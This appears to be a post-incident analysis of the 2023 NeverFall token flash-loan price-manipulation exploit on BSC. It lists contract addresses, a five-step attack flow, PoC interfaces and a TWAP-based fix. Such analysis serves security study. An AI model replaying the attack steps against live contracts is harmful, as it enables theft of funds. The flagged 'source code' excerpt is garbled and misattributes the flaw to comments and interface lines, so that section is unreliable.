# NeverFall Exploit — buy() / sell() Flash Loan Price Manipulation

## Metadata
| Field | Value |
|---|---|
| Date | 2023-05 |
| Project | NeverFall |
| Chain | BSC |
| Loss | Unknown |
| Attacker | Unknown |
| Attack TX | Unknown |
| Vulnerable Contract | NeverFall Token: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5 |
| Block | Unknown |
| CWE | CWE-682 (Incorrect Calculation — spot price used for buy/sell) |
| Vulnerability Type | buy() / sell() Spot Price Manipulation via Flash Loan |

## Summary
NeverFall's `buy()` and `sell()` functions priced tokens against the current pool spot price without slippage protection or TWAP. An attacker borrowed 1.6M USDT from a flash loan, purchased 200K NeverFall directly, swapped 1.4M USDT for NeverFall via PancakeSwap to inflate the price, then called `sell()` to dump 75.5M NeverFall at the inflated spot price.

## Vulnerability Details
- **CWE-682**: `buy()` and `sell()` in NeverFall computed token amounts from the current reserve ratio (spot price) without any time-weighted average or minimum/maximum price bounds. The flash loan let the attacker inflate the spot price and immediately sell at it — all within one transaction.

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: NeverFallToken.sol
 * manner, since when dealing with meta-transactions the account sending and  // ❌

// ...

     * Internal function without access restriction.  // ❌

// ...

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);  // ❌

// ...

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);  // ❌

// ...

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  // ❌
```

## Attack Flow (from testExploit())
```solidity
// 1. BUSD_USDT_Pool.swap(0, 1_600_000e18, address(this), data)
//    → flash loan 1.6M USDT
// 2. NeverFall.buy(200_000e18)
//    → buy 200K NeverFall at current spot price
// 3. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
//       1_400_000e18 USDT, 0, [USDT→NeverFall], ...
//    )  // push NeverFall price up via large AMM swap
// 4. NeverFall.sell(75_500_000e18)
//    → sell 75.5M NeverFall at now-inflated spot price
// 5. Repay flash loan: 1_600_000 USDT + 0.3% fee
```

## Interfaces from PoC
```solidity
interface INeverFall {
    function buy(uint256 usdtAmount) external;
    function sell(uint256 tokenAmount) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
}
```

## Key Addresses
| Label | Address |
|---|---|
| NeverFall Token | 0x5ABDe8B434133C98c36F4B21476791D95D888bF5 |
| Creator Address | 0x051d6a5f987e4fc53B458eC4f88A104356E6995a |
| BUSD-USDT Pool | 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00 |
| USDT | 0x55d398326f99059fF775485246999027B3197955 |
| PancakeRouter | 0x10ED43C718714eb63d5aA57B78B54704E256024E |

## Root Cause
`buy()` and `sell()` used current AMM reserve ratios as the price oracle without any protection against single-transaction manipulation. A large flash-loan-funded swap could move the spot price dramatically before sell was called.

## Fix
```solidity
// Use Uniswap V2 TWAP instead of spot price:
uint256 public constant TWAP_PERIOD = 30 minutes;

function _getTokenPrice() internal view returns (uint256) {
    (uint256 price0Cumulative, uint256 price1Cumulative, uint32 blockTimestamp) =
        UniswapV2OracleLibrary.currentCumulativePrices(pair);
    uint32 timeElapsed = blockTimestamp - blockTimestampLast;
    require(timeElapsed >= TWAP_PERIOD, "TWAP period not elapsed");
    // ... compute TWAP from cumulative prices
}
```

## References
- BSC NeverFall: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5
- Flash loan source: BUSD-USDT Pool 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00